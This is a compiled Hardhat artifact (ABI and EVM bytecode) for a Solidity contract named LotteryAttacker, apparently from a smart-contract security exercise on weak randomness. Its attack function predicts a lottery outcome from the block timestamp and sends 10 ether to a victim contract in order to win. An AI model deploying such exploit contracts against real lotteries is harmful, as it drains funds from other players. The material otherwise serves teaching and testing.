{
  "_format": "hh-sol-artifact-1",
  "contractName": "LotteryAttacker",
  "sourceName": "contracts/weak-randomness/LotteryAttacker.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_victim",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516109da3803806109da833981810160405281019061003291906101c4565b61004e61004361009560201b60201c565b61009d60201b60201c565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506101f1565b600033905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061019182610166565b9050919050565b6101a181610186565b81146101ac57600080fd5b50565b6000815190506101be81610198565b92915050565b6000602082840312156101da576101d9610161565b5b60006101e8848285016101af565b91505092915050565b6107da806102006000396000f3fe60806040526004361061003f5760003560e01c8063715018a6146100445780638da5cb5b1461005b5780639e5faafc14610086578063f2fde38b14610090575b600080fd5b34801561005057600080fd5b506100596100b9565b005b34801561006757600080fd5b50610070610141565b60405161007d91906104d9565b60405180910390f35b61008e61016a565b005b34801561009c57600080fd5b506100b760048036038101906100b29190610525565b61028b565b005b6100c1610383565b73ffffffffffffffffffffffffffffffffffffffff166100df610141565b73ffffffffffffffffffffffffffffffffffffffff1614610135576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161012c906105af565b60405180910390fd5b61013f600061038b565b565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b610172610383565b73ffffffffffffffffffffffffffffffffffffffff16610190610141565b73ffffffffffffffffffffffffffffffffffffffff16146101e6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101dd906105af565b60405180910390fd5b60006101f061044f565b9050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166343046844678ac7230489e80000836040518363ffffffff1660e01b815260040161025691906105eb565b6000604051808303818588803b15801561026f57600080fd5b505af1158015610283573d6000803e3d6000fd5b505050505050565b610293610383565b73ffffffffffffffffffffffffffffffffffffffff166102b1610141565b73ffffffffffffffffffffffffffffffffffffffff1614610307576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102fe906105af565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415610377576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161036e90610678565b60405180910390fd5b6103808161038b565b50565b600033905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b6000600160fe4260405160200161046691906106c3565b6040516020818303038152906040528051906020012060001c610489919061070d565b610493919061076d565b905090565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006104c382610498565b9050919050565b6104d3816104b8565b82525050565b60006020820190506104ee60008301846104ca565b92915050565b600080fd5b610502816104b8565b811461050d57600080fd5b50565b60008135905061051f816104f9565b92915050565b60006020828403121561053b5761053a6104f4565b5b600061054984828501610510565b91505092915050565b600082825260208201905092915050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b6000610599602083610552565b91506105a482610563565b602082019050919050565b600060208201905081810360008301526105c88161058c565b9050919050565b600060ff82169050919050565b6105e5816105cf565b82525050565b600060208201905061060060008301846105dc565b92915050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b6000610662602683610552565b915061066d82610606565b604082019050919050565b6000602082019050818103600083015261069181610655565b9050919050565b6000819050919050565b6000819050919050565b6106bd6106b882610698565b6106a2565b82525050565b60006106cf82846106ac565b60208201915081905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061071882610698565b915061072383610698565b925082610733576107326106de565b5b828206905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610778826105cf565b9150610783836105cf565b92508260ff038211156107995761079861073e565b5b82820190509291505056fea264697066735822122079fae6b3cee0c10aca6c591e252dbab55d29155844fe678cef7bda646f3f6ff564736f6c63430008090033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}